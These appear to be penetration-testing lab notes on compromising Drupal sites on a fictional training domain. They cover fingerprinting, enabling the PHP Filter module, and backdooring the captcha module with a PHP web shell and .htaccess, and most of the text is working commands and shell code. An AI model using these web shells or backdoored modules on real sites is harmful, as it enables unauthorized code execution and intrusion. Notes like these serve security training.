# Drupal Attack

### Discovery/Footprinting

```shell-session
curl -s http://drupal.inlanefreight.local | grep Drupal
```

### Enumeration

```shell-session
curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
```

```
droopescan scan drupal -u http://drupal-qa.inlanefreight.local
```

### Attacking Drupal

#### Leveraging the PHP Filter Module

* after login select php filters

```
http://drupal-qa.inlanefreight.local/#overlay=admin/modules
```

<figure><img src="../.gitbook/assets/image (6) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* From here, we could tick the check box next to the module and scroll down to `Save configuration`. Next, we could go to Content --> Add content and create a `Basic page`.

```
http://drupal-qa.inlanefreight.local/#overlay=node/add
```

<figure><img src="../.gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```php
<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>
```

```
http://drupal-qa.inlanefreight.local/#overlay=node/add/page
```

#### From version 8 onwards,

* the [PHP Filter](https://www.drupal.org/project/php/releases/8.x-1.1) module is not installed by default.
* To leverage this functionality, we would have to install the module ourselves.

```shell-session
wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```

* Once downloaded go to `Administration` > `Reports` > `Available updates`.

```
http://drupal.inlanefreight.local/admin/reports/updates/install
```

<figure><img src="../.gitbook/assets/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* From here, click on `Browse,` select the file from the directory we downloaded it to, and then click `Install`.
* Once the module is installed, we can click on `Content` and create a new basic page, similar to how we did in the Drupal 7 example. Again, be sure to select `PHP code` from the `Text format` dropdown.

#### Uploading a Backdoored Module

* Drupal allows users with appropriate permissions to upload a new module.
* A backdoored module can be created by adding a shell to an existing module

```shell-session
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
```

```shell-session
tar xvf captcha-8.x-1.2.tar.gz
```

* Create a PHP web shell with the contents:

```php
<?php
system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);
?>
```

* Next, we need to create a .htaccess file to give ourselves access to the folder.
  * This is necessary as Drupal denies direct access to the /modules folder.

```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```

```shell-session
mv shell.php .htaccess captcha
```

```shell-session
tar cvf captcha.tar.gz captcha/
```

* Assuming we have administrative access to the website, click on `Manage` and then `Extend` on the sidebar
  * Next, click on the `+ Install new module` button, and we will be taken to the install page, such as `http://drupal.inlanefreight.local/admin/modules/install`&#x20;
  * Browse to the backdoored Captcha archive and click `Install`.

<figure><img src="../.gitbook/assets/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```shell-session
curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```
